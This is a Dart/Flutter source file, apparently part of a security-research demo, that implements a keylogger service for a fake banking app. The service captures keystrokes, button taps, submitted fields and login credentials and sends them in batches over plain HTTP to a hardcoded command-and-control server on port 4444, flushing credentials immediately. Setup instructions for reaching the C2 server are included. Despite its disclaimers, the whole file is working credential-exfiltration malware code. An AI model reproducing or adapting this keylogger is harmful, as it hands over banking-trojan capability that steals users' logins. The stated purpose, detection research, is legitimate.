// DEMONSTRATION PURPOSE ONLY
// Intentionally insecure implementation for cybersecurity research.
// Do not use in production.
//
// KeyloggerService sends every keystroke and button-click event that
// occurs inside the app to the remote C2 server (c2_server.py).
// This is a DEMONSTRATION of how Android banking trojans exfiltrate
// keystrokes. No real financial data is transmitted — all data originates
// from the demobankfake test environment.
//
// ARGUS detection targets:
// - Plaintext HTTP POST to a hardcoded IP (cleartext credential exfiltration)
// - Keystroke capture on login fields
// - Button-click tracking
// - Session telemetry

// ignore_for_file: avoid_print

import 'dart:async';
import 'dart:convert';
import 'dart:io';

/// Android Emulator with ADB reverse port-forward active.
///
/// Run once before starting the app:
///   adb reverse tcp:4444 tcp:4444
///
/// Then the emulator can reach the host PC's C2 server on 10.0.2.2:4444.
/// If you switch to a physical phone on the same Wi-Fi, use your PC's LAN IP.
const String _serverHost = '10.0.2.2';
const int    _serverPort = 4444;
const String _serverUrl  = 'http://$_serverHost:$_serverPort/';

/// Unique demo device ID (not real hardware identifier).
final String _demoDeviceId =
    'DEMO_${DateTime.now().millisecondsSinceEpoch.toRadixString(16).toUpperCase()}';

/// DEMONSTRATION PURPOSE ONLY
///
/// Singleton service that queues and batch-sends telemetry events to the
/// Python C2 server over plain HTTP.
///
/// Events are batched and sent on a periodic timer (every 250 ms) rather than
/// on every individual keystroke.  This avoids overwhelming the emulator's
/// virtual network layer with dozens of short-lived TCP connections per second
/// and prevents the "Connection reset by peer" errors that occur when the
/// single-threaded Python HTTPServer cannot drain its Accept queue fast enough.
class KeyloggerService {
  KeyloggerService._();
  static final KeyloggerService instance = KeyloggerService._();

  final List<Map<String, dynamic>> _queue = [];
  Timer? _flushTimer;

  // Single persistent HTTP client — avoids creating a new TCP connection
  // (and a new ephemeral port) for every batch.
  HttpClient? _client;
  bool _sessionStarted = false;
  bool _isSending = false;

  // ── Public API ─────────────────────────────────────────────────────────────

  /// Call once when the app launches to announce a new monitoring session.
  void startSession() {
    if (_sessionStarted) return;
    _sessionStarted = true;

    _client = HttpClient();
    _client!.connectionTimeout = const Duration(seconds: 3);

    _enqueue({
      'type':      'session_start',
      'device_id': _demoDeviceId,
      'screen':    'APP',
    });
    _startFlushTimer();
    _testConnectivity();
  }

  /// Quick connectivity check — verifies the C2 server is reachable on startup.
  void _testConnectivity() async {
    try {
      // Use a fresh one-shot client for the startup probe so it doesn't
      // interfere with the persistent client.
      final probe = HttpClient();
      probe.connectionTimeout = const Duration(seconds: 3);
      final request = await probe.postUrl(Uri.parse(_serverUrl));
      request.headers.set('Content-Type', 'application/json');
      request.write('[]');
      final response = await request.close();
      await response.drain<void>();
      probe.close();
      print('[C2] ✓ Server reachable at $_serverUrl');
    } catch (e) {
      print('[C2] ✗ WARNING: Cannot reach C2 server at $_serverUrl');
      print('[C2]   → Is c2_server.py running? Run: python c2_server.py');
      print('[C2]   → Error: $e');
    }
  }

  /// Report every individual keystroke in a text field.
  ///
  /// Events are enqueued and sent on the next timer tick (≤ 250 ms).
  void logKeystroke({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'keystroke',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
  }

  /// Report a button / link tap.
  void logButtonClick({
    required String screen,
    required String label,
  }) {
    _enqueue({
      'type':   'button_click',
      'screen': screen,
      'label':  label,
    });
  }

  /// Report a field that has been fully submitted / confirmed.
  void logFieldSubmit({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'field_submit',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
  }

  /// DEMONSTRATION PURPOSE ONLY — reports a captured credential pair.
  ///
  /// Flushed immediately (bypasses the timer) so credentials appear without delay.
  void logCredential({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'credential_capture',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
    // Flush immediately — credentials must appear without delay.
    _flush();
  }

  // ── Internal helpers ───────────────────────────────────────────────────────

  void _enqueue(Map<String, dynamic> event) {
    event['ts'] = DateTime.now().toIso8601String();
    _queue.add(event);
  }

  void _startFlushTimer() {
    _flushTimer?.cancel();
    // Batch-send queued events every 250 ms for near-real-time display
    // while keeping the connection rate low enough for the emulator.
    _flushTimer = Timer.periodic(const Duration(milliseconds: 250), (_) {
      if (_queue.isNotEmpty) _flush();
    });
  }

  void _flush() {
    if (_queue.isEmpty || _isSending) return;
    final batch = List<Map<String, dynamic>>.from(_queue);
    _queue.clear();
    _send(batch);
  }

  Future<void> _send(List<Map<String, dynamic>> batch) async {
    if (_client == null) return;
    _isSending = true;
    try {
      final request = await _client!.postUrl(Uri.parse(_serverUrl));
      request.headers.set('Content-Type', 'application/json');
      request.headers.set('Connection', 'close'); // HTTP/1.0 compat
      request.write(jsonEncode(batch));
      final response = await request.close();
      await response.drain<void>();
      print('[C2] Sent ${batch.length} event(s) to $_serverUrl');
    } catch (e) {
      final errStr = e.toString().toLowerCase();
      String hint;
      if (errStr.contains('refused') || errStr.contains('connection refused')) {
        hint = 'Connection refused — is c2_server.py running?';
      } else if (errStr.contains('unreachable') || errStr.contains('no route')) {
        hint = 'Network unreachable — check emulator network or run: adb reverse tcp:4444 tcp:4444';
      } else if (errStr.contains('timeout')) {
        hint = 'Connection timed out — check Windows Firewall (allow Python on port 4444)';
      } else if (errStr.contains('reset')) {
        hint = 'Connection reset — restart C2 server (Ctrl+C then: python c2_server.py)';
      } else if (errStr.contains('host')) {
        hint = 'DNS/host error — verify _serverHost=\"$_serverHost\" is correct for your setup';
      } else {
        hint = 'Unexpected error — check Flutter console for details';
      }
      print('[C2] ERROR sending to $_serverUrl  →  $e');
      print('[C2]   → $hint');
    } finally {
      _isSending = false;
    }
  }
}
